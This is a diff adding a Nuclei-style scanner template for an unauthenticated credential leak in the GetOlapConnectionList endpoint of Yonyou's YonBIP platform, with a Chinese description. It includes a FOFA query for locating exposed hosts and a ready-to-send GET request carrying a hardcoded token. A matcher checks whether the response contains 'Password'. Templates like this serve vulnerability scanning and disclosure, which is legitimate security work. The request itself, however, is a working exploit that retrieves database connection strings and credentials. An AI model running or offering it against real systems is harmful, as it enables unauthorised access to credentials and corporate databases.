@@ -1,0 +1,26 @@
+id: yonyou-yonbip-getolapconnectionlist-leak
+
+info:
+  name: "用友YonBIP商业创新平台GetOlapConnectionList接口敏感配置信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="iuap-apcom-workbench/"
+          YonBIP商业创新平台作为用友面向大型企业构建的数字化服务平台，集成高可用技术架构与核心商业应用模块。其GetOlapConnectionList接口存在权限校验缺失问题，攻击者可利用此接口未授权访问，获取存储的数据库连接字符串及凭证信息。该漏洞可能造成企业核心数据库资产暴露，威胁业务系统数据安全。
+  tags: 用友
+
+http:
+- raw:
+  - |
+    GET /bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Password'
